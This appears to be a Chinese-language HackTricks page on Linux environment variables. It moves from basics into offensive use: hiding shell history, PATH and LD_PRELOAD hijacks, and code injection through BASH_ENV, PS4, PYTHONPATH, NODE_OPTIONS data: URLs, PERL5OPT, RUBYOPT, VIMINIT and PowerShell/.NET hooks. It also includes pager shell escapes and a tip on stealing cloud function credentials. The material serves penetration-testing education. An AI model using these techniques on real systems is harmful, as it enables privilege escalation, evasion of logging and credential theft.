# Linux 环境变量

{{#include ../../banners/hacktricks-training.md}}

## 全局变量

全局变量**将会被** **子进程**继承。

你可以执行以下操作，为当前会话创建一个全局变量：
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
此变量可供当前会话及其子进程访问。

你可以使用以下命令**删除**变量：
```bash
unset MYGLOBAL
```
## Local variables

**local variables** 只能由**当前 shell/script** **accessed**。
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## 列出当前变量
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` 的内容以 **NUL-separated** 形式分隔，因此以下变体通常更易于阅读：
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
如果你正在继承的环境中寻找 **凭据** 或 **有趣的服务配置**，也请查看 [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md)。

## 常见变量

来源：[https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)。<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** 使用的显示器。此变量通常设置为 **:0.0**，表示当前计算机上的第一个显示器。
- **EDITOR** – 用户首选的文本编辑器。
- **HISTFILESIZE** – history 文件中包含的最大行数。
- **HISTSIZE** – 用户结束会话时添加到 history 文件中的行数。
- **HOME** – 你的主目录。
- **HOSTNAME** – 计算机的 hostname。
- **LANG** – 当前语言。
- **MAIL** – 用户 mail spool 的位置。通常为 **/var/spool/mail/USER**。
- **MANPATH** – 搜索 manual page 的目录列表。
- **OSTYPE** – 操作系统类型。
- **PS1** – bash 中的默认提示符。
- **PATH** – 存储包含要执行的二进制文件的所有目录路径，使你只需指定文件名，而不必使用相对路径或绝对路径即可执行文件。
- **PWD** – 当前工作目录。
- **SHELL** – 当前 command shell 的路径（例如 **/bin/bash**）。
- **TERM** – 当前 terminal 类型（例如 **xterm**）。
- **TZ** – 你的时区。
- **USER** – 当前用户名。

## 对 hacking 有用的变量

并非所有变量都同样有用。从 offensive 角度来看，应优先关注会改变 **搜索路径**、**startup files**、**dynamic linker 行为** 或 **audit/logging** 的变量。

### **HISTFILESIZE**

将 **此变量的值更改为 0**，这样当你 **结束会话** 时，**history 文件**（\~/.bash_history）会被 **截断为 0 行**。
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

将此变量的 **值改为 0**，这样命令就不会保存在**内存中的历史记录**中，也不会被写回**历史文件**（\~/.bash_history）。
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

如果将**此变量的值设置为 `ignorespace` 或 `ignoreboth`**，则以额外空格开头的任何命令都不会保存到历史记录中。
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

将 **history file** 指向 **`/dev/null`**，或完全取消设置。通常，这比仅更改 history 大小更可靠。
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

进程将使用此处声明的 **proxy**，通过 **http 或 https** 连接到互联网。
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`：遵循该变量的工具/协议所使用的默认代理。
- `no_proxy`：应直接连接的绕过列表（主机/域名/CIDR）。
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
根据所使用的工具，可能使用小写或大写变体（`http_proxy`/`HTTP_PROXY`、`no_proxy`/`NO_PROXY`）。

### SSL_CERT_FILE & SSL_CERT_DIR

进程将信任 **这些环境变量** 中指定的证书。这可用于让 **`curl`**、**`git`**、Python HTTP 客户端或软件包管理器信任由攻击者控制的 CA（例如，让拦截代理看起来合法）。
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

如果特权 wrapper/script 在执行命令时**没有使用绝对路径**，那么 `PATH` 中第一个由攻击者控制的目录将优先生效。这是 `sudo`、cron jobs、shell wrappers 和自定义 SUID helpers 中许多 **PATH hijacks** 背后的原语。查找 `env_keep+=PATH`、较弱的 `secure_path`，或通过名称调用 `tar`、`service`、`cp`、`python` 等命令的 wrappers。
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
如需查看利用 `PATH` 的完整 privilege escalation 链，请参阅 [Linux Privilege Escalation](linux-privilege-escalation/README.md)。

### **HOME & XDG_CONFIG_HOME**

`HOME` 不仅是目录引用：许多工具会自动从 `$HOME` 或 `$XDG_CONFIG_HOME` 加载 **dotfiles**、**plugins** 和 **per-user configuration**。如果特权工作流保留这些值，那么 **config injection** 可能比二进制劫持更容易。
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
有趣的目标包括 `.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`，以及 `.terraformrc` 等特定工具的文件。

### **LD_PRELOAD、LD_LIBRARY_PATH 与 LD_AUDIT**

这些变量会影响**dynamic linker**：

- `LD_PRELOAD`：强制优先加载额外的共享对象。
- `LD_LIBRARY_PATH`：将库搜索目录置于搜索路径前面。
- `LD_AUDIT`：加载用于观察库加载和符号解析的 auditor libraries。

如果特权命令会保留这些变量，它们对于 **hooking**、**instrumentation** 和 **privilege escalation** 极具价值。在 **secure-execution** 模式（`AT_SECURE`，例如 setuid/setgid/capabilities）下，loader 会移除或限制其中许多变量。不过，早期 loader 阶段中的 parser bugs 仍然具有很高的影响，因为它们会在目标程序之前运行。<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` 会改变 glibc 的早期行为（例如 allocator tunables），在 exploit 实验环境中非常实用。从安全角度看它也很重要，因为 **dynamic loader 会非常早地解析它**。2023 年的 **Looney Tunables** 漏洞很好地提醒了我们：在 loader 中解析的单个环境变量，可能成为针对 SUID 程序的 **本地权限提升原语**。<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

如果以**非交互方式**启动 **Bash**，它会检查 `BASH_ENV`，并在运行目标脚本之前 source 该文件。当 Bash 以 `sh` 身份调用，或处于 POSIX 风格的交互模式时，也可能会检查 `ENV`。如果环境变量由攻击者控制，这是将 shell wrapper 转化为代码执行的经典方式。
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bash 在 **real/effective IDs 不一致**时会忽略这些 startup files；`-p` 会保留 effective ID，但不会启用这些 startup files，因此具体行为取决于 wrapper 如何调用 shell。对于在启动 Bash **之前**调用 `setuid()`/`setgid()` 的特权 wrapper，务必小心：一旦这些 ID 再次匹配，Bash 可能会信任原本会被忽略的 `BASH_ENV`、`ENV` 以及相关 shell 状态。<sup>[[1]](#references)</sup>

### **PS4 + SHELLOPTS (xtrace)**

当 Bash 启用 **xtrace** 时，它会展开 `PS4`，并在每条被跟踪的命令之前打印该值。`PS4` 的展开方式类似 prompt，因此其中的 **command substitution** 会被执行。关键在于，仅通过导出 `SHELLOPTS=xtrace` 就可以从环境中启用 xtrace——命令行中无需使用 `-x`——因此受害者运行的任何 Bash 脚本都可能变成 code execution。<sup>[[7]](#references)</sup>
```bash
echo 'echo target' > /tmp/victim.sh

# Pure environment-variable injection (no -x flag)
SHELLOPTS=xtrace PS4='$(id > /tmp/ps4-executed)' bash /tmp/victim.sh
cat /tmp/ps4-executed

# Same primitive when a job is run with debugging enabled
PS4='$(touch /tmp/ps4-x)' bash -x /tmp/victim.sh
```
`PS4` 在 xtrace 启用之前不会产生任何作用（`SHELLOPTS=xtrace`、`set -x` 或 `bash -x`），而 Bash 在 privileged/setuid 上下文中会像处理 `BASH_ENV` 一样移除 `SHELLOPTS`。

### **PYTHONPATH、PYTHONHOME、PYTHONSTARTUP、PYTHONINSPECT 和 PYTHONBREAKPOINT**

这些变量会改变 Python 的启动方式：

- `PYTHONPATH`：在 import 搜索路径前置路径。
- `PYTHONHOME`：重新定位标准库目录树。
- `PYTHONSTARTUP`：在交互式提示符出现前执行文件。
- `PYTHONINSPECT=1`：脚本执行完毕后进入交互模式。
- `PYTHONBREAKPOINT`：代码执行到 `breakpoint()` 时调用 `package.module.callable`（并导入其模块）。<sup>[[8]](#references)</sup>

对于会在可控环境中调用 Python 的维护脚本、debugger、shell 和 wrapper，它们很有用。`python -E` 和 `python -I` 会忽略所有 `PYTHON*` 变量。
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode

# PYTHONBREAKPOINT: runs when the target reaches breakpoint()
printf 'import sys\nbreakpoint(*sys.argv[1:])\n' > /tmp/bp.py
PYTHONBREAKPOINT='os.system' python3 /tmp/bp.py 'id'   # requires the code to hit breakpoint()
```
一个近期的真实案例是 2024 年 Ubuntu/Debian 系统上的 **needrestart** LPE：由 root 所有的 scanner 从 `/proc/<PID>/environ` 复制了非特权进程的 `PYTHONPATH`，随后执行 Python。公开的 exploit 在攻击者控制的路径中植入了 `importlib/__init__.so`，使 Python 在自身初始化期间执行攻击者代码，甚至早于 helper 的硬编码脚本发挥作用。<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl 同样提供了有用的启动变量：

- `PERL5LIB`：预置 library 目录。
- `PERL5OPT`：注入开关，就像它们位于每个 `perl` 命令行中一样。

这可以强制执行 **automatic module loading**，或在目标脚本执行任何有意义的操作之前改变 interpreter 行为。Perl 会在 **taint / setuid / setgid** 上下文中忽略这些变量，但对于普通的 root-run wrappers、CI jobs、installers 以及自定义 sudoers 规则，它们仍然非常重要。
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` 会将 **Node.js CLI flags** 预置到所有继承该环境的 `node` 进程中。因此，它可用于攻击最终会调用 Node 的 wrappers、CI jobs、Electron helpers 和 sudo rules。通常最值得关注的 offensive flags 是：

- `--require <file>`：在目标脚本之前预加载 CommonJS 文件。
- `--import <module>`：在目标脚本之前预加载 ES module。

Node 会拒绝 `NODE_OPTIONS` 中的某些危险 flags，但 `--require` 和 `--import` 明确被允许，并且会在常规命令行参数**之前**处理。<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
#### 使用 `data:` URL 进行无文件 preload

当你可以设置 `NODE_OPTIONS`，但**无法在目标上写入文件**（只读文件系统、受限 API、serverless runtime 等）时，`--import` 接受 `data:text/javascript,` URL，因此整个 payload 都包含在环境变量自身中。JavaScript 必须**进行完整的 URL 编码**——Node 会将该值解析为 URL，因此任何原始空格（或其他未编码字符）都会截断 payload 并抛出 `SyntaxError`。此方法适用于 Node 20.6+，该版本将 `--import` 加入了 `NODE_OPTIONS` allowlist。<sup>[[4]](#references)</sup>
```bash
# fileless proof of execution (note: no raw spaces in the data URL)
NODE_OPTIONS='--import data:text/javascript,console.log(%22fileless_preload%22)' node -e 'console.log("target")'

# Real payload, URL-encoded (run a command / exfiltrate env vars)
PAYLOAD=$(python3 - <<'PY'
import urllib.parse
js = "import('child_process').then(cp=>console.log(cp.execSync('id').toString()))"
print("--import data:text/javascript," + urllib.parse.quote(js, safe=""))
PY
)
NODE_OPTIONS="$PAYLOAD" node -e 'console.log("target")'
```
> [!TIP]
> 这是在函数运行 Node 的 **managed cloud runtimes** 中，将 `NODE_OPTIONS` 控制转化为 RCE 的常见方式。例如，攻击者只能修改某个 Lambda 的配置（`lambda:UpdateFunctionConfiguration`，没有 `iam:PassRole`，也无法更新代码）时，可以注入 `NODE_OPTIONS=--import data:text/javascript,<payload>`，在函数内部运行代码，并窃取其 execution-role credentials。注入的 module 会在 handler 之前运行，之后 handler 仍会正常执行。

对于间接设置 `NODE_OPTIONS` 的 remote gadget chains（例如通过 prototype-pollution 实现 RCE），请查看[此页面](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)。

### **RUBYLIB & RUBYOPT**

Ruby 提供了同类的 startup abuse：

- `RUBYLIB`：将目录添加到 Ruby 的 load path 前面。
- `RUBYOPT`：向每次 `ruby` 调用中注入 `-r` 等命令行选项。
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024 年的 **needrestart** vulnerabilities 表明，这并不只是实验室技巧：同一个易受攻击、由 root 拥有的 helper 不仅可能被滥用 `PYTHONPATH`，还可以被诱导使用由 attacker-controlled 的 `RUBYLIB` 运行 Ruby，从 attacker directory 加载 `enc/encdb.so`。<sup>[[3]](#references)</sup>

### **VIMINIT 与 EXINIT**

Vim/Neovim 会在正常启动期间执行 `VIMINIT`（或其 `EXINIT` fallback）中包含的 Ex 命令。Ex 命令包括 `:!cmd` 和 `:call system(...)`，因此只要控制该变量，就能在 victim 打开 Vim 时实现代码执行（例如 root 执行 `sudo vim`、`crontab -e`、`visudo`，或 `git`/`less` 启动 `$EDITOR` 等场景）。<sup>[[9]](#references)</sup>
```bash
echo hi > /tmp/victim.txt
printf ':qa!\n' | VIMINIT='silent! !touch /tmp/vim-executed' vim /tmp/victim.txt
test -e /tmp/vim-executed && echo 'VIMINIT executed'
```
Batch mode (`vim -es`/`-Es`) 会跳过这些变量，但正常的交互式启动会执行它们。

### **PowerShell (pwsh)：PSModulePath、DOTNET_STARTUP_HOOKS 与 CLR profiler**

PowerShell Core (`pwsh`) 可在 Linux/macOS（以及 Windows）上运行，并且是一个 **.NET application**，因此多个环境变量可以让任何继承环境的 `pwsh` invocation 实现 code execution——这对攻击 cron/systemd jobs、CI runners 以及调用 `pwsh` 的 privileged wrappers 很有用。

- `PSModulePath`：PowerShell 会递归搜索此列表中的每个目录，查找 `.psd1`/`.psm1` modules，并在首次引用其导出的 command 时 **auto-loads** 其中一个。添加一个目录作为前缀后，module 的顶层 code 会在 import 时运行；由于解析顺序为 *Alias → Function → Cmdlet*，导出的 function 甚至可以 shadow victim 调用的 built-in cmdlet。<sup>[[10]](#references)</sup>
- `XDG_CONFIG_HOME`：重定位 `powershell/Microsoft.PowerShell_profile.ps1`，该文件会在启动时执行（除非使用 `-NoProfile`）。
- `DOTNET_STARTUP_HOOKS`：一个 managed assembly，其 `StartupHook.Initialize()` 会在 `Main` 之前运行（由每个 .NET app 共享）。
- `CORECLR_ENABLE_PROFILING=1` + `CORECLR_PROFILER={guid}` + `CORECLR_PROFILER_PATH=/path/evil.so`：CLR profiling API 会在进程启动时将攻击者的 library 加载到进程中（path vars 优先于 registry；`DOTNET_*` 是较新的 alias）。在 Windows PowerShell 5.1（.NET Framework）中，使用 `COR_ENABLE_PROFILING`/`COR_PROFILER`/`COR_PROFILER_PATH`。MITRE ATT&CK T1574.012。<sup>[[11]](#references)</sup>
```bash
# PSModulePath module auto-load hijack
mkdir -p /tmp/evil/Hijack
printf 'New-Item -ItemType File /tmp/ps-mod-exec -Force|Out-Null\nfunction Invoke-Report{}\nExport-ModuleMember -Function Invoke-Report\n' > /tmp/evil/Hijack/Hijack.psm1
printf "@{ModuleVersion='1.0';RootModule='Hijack.psm1';FunctionsToExport=@('Invoke-Report')}\n" > /tmp/evil/Hijack/Hijack.psd1
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/ps-mod-exec && echo 'PSModulePath auto-load executed'
```
在 Windows 上，`PSExecutionPolicyPreference=Bypass` 还会移除“阻止未签名脚本”的防护机制，因此植入的 profile/module 实际上会运行。有关完整 PoCs，请参阅专门页面：

{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-powershell-applications-injection.md
{{#endref}}

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

某些工具不仅会从环境中读取路径，还会将该值传递给 **shell**、**editor** 或 **input preprocessor**。因此，当特权 wrapper 运行 `git`、`man`、`less` 或类似的文本查看器时，以下变量尤其值得关注：

- `PAGER`、`MANPAGER`、`GIT_PAGER`：选择 pager 命令。
- `GIT_EDITOR`、`VISUAL`、`EDITOR`：选择 editor 命令，通常还可包含参数。
- `LESSOPEN`、`LESSCLOSE`：定义 `less` 打开文件时运行的前置/后置处理器。
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git 还支持通过 `GIT_CONFIG_COUNT`、`GIT_CONFIG_KEY_<n>` 和 `GIT_CONFIG_VALUE_<n>` 实现**仅通过环境变量的配置注入**，而无需写入磁盘：
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
从 post-exploitation 的角度来看，还要记住，继承的环境通常包含 **凭据**、**代理设置**、**服务 token** 或 **cloud 密钥**。查看 [Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md)，了解 `/proc/<PID>/environ` 和 `systemd` `Environment=` 的搜索。

### PS1

更改提示符的显示方式。

[**这是一个示例**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root：

![PERL5OPT & PERL5LIB - PS1：这是一个示例](<../images/image (897).png>)

普通用户：

![PERL5OPT & PERL5LIB - PS1：一个、两个和三个后台作业](<../images/image (740).png>)

一个、两个和三个后台作业：

![PERL5OPT & PERL5LIB - PS1：一个、两个和三个后台作业](<../images/image (145).png>)

一个后台作业、一个已停止的作业，且上一条命令未正确完成：

![PERL5OPT & PERL5LIB - PS1：一个后台作业、一个已停止的作业，且上一条命令未正确完成](<../images/image (715).png>)

## References

- [1] [GNU Bash 手册 - Bash 启动文件](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - 需要关注的 needrestart LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI 文档 - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [常见环境变量 - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911：Looney Tunables - glibc 的 ld.so 中的本地权限提升 - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
- [7] [GNU Bash 手册 - Bash 变量（`PS4`）与 Set 内建命令（`xtrace`/`SHELLOPTS`）](https://www.gnu.org/software/bash/manual/html_node/Bash-Variables.html)
- [8] [PEP 553 - 内置 breakpoint() 和 PYTHONBREAKPOINT](https://peps.python.org/pep-0553/)
- [9] [Vim 文档 - starting.txt（`VIMINIT`、`EXINIT`）](https://vimhelp.org/starting.txt.html#initialization)
- [10] [about_PSModulePath 与 PowerShell 模块自动加载](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [11] [.NET 调试与 profiling 配置设置（`CORECLR_`/`DOTNET_`/`COR_` profiler 变量）](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
{{#include ../../banners/hacktricks-training.md}}
